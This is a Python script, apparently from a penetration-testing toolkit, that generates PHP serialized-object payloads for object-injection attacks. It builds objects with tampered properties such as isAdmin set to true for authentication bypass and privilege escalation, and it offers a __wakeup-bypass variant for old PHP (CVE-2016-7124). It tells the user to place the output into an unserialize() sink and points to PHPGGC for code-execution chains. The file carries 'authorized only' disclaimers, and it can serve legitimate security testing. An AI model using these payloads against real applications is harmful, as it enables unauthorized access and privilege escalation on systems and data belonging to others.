#!/usr/bin/env python3
"""
php_object_poc.py — build PHP serialized objects for object-injection / auth-bypass testing (authorized).

PHP object injection is often exploited WITHOUT a code-exec gadget: if the app unserialize()s a session/user object,
flipping a property (isAdmin false->true, role user->admin) is a clean auth-bypass/privesc. This emits correct PHP
serialize() strings, and can produce a __wakeup-bypass variant (wrong property count skips __wakeup — old-PHP CVE-2016-7124).
For RCE POP chains use PHPGGC (see ysoserial_cheat.md); this is the tampering/POP-scaffolding helper.

Discipline: tamper YOUR OWN session object to prove the missing integrity check; don't touch other users' data. Authorized only.

Usage:
  # object of class User with properties (types: s=string, i=int, b=bool):
  python3 php_object_poc.py --class User --prop name:s:guest --prop isAdmin:b:1 --prop level:i:9
  # __wakeup bypass (declare N+1 props but supply N):
  python3 php_object_poc.py --class User --prop isAdmin:b:1 --wakeup-bypass
"""
import argparse, sys


def php_val(spec):
    """spec 'type:value' -> PHP serialized value. types: s(string) i(int) b(bool) d(double) N(null)."""
    if spec == "N":
        return "N;"
    t, _, v = spec.partition(":")
    if t == "s":
        return f's:{len(v.encode())}:"{v}";'
    if t == "i":
        return f"i:{int(v)};"
    if t == "d":
        return f"d:{float(v)};"
    if t == "b":
        return f"b:{1 if v not in ('0', '', 'false', 'False') else 0};"
    sys.exit(f"unknown type in --prop '{spec}' (use s/i/b/d/N)")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--class", dest="cls", required=True, help="PHP class name")
    ap.add_argument("--prop", action="append", default=[], metavar="name:type:value",
                    help="property e.g. isAdmin:b:1  name:s:guest  level:i:9  (repeatable)")
    ap.add_argument("--wakeup-bypass", action="store_true",
                    help="declare one MORE property than supplied so __wakeup() is skipped (old-PHP bypass)")
    a = ap.parse_args()

    parts = []
    for p in a.prop:
        name, _, rest = p.partition(":")
        parts.append(f's:{len(name.encode())}:"{name}";' + php_val(rest))
    count = len(a.prop) + (1 if a.wakeup_bypass else 0)
    body = "".join(parts)
    out = f'O:{len(a.cls.encode())}:"{a.cls}":{count}:{{{body}}}'
    print(out)
    print(f"\n[i] class={a.cls} props={len(a.prop)} declared_count={count}"
          + ("  (__wakeup-bypass: count > supplied)" if a.wakeup_bypass else ""), file=sys.stderr)
    print("[i] Drop into the unserialize() sink. For RCE POP chains use PHPGGC. Tamper your OWN object only (§10/§16).",
          file=sys.stderr)


if __name__ == "__main__":
    main()
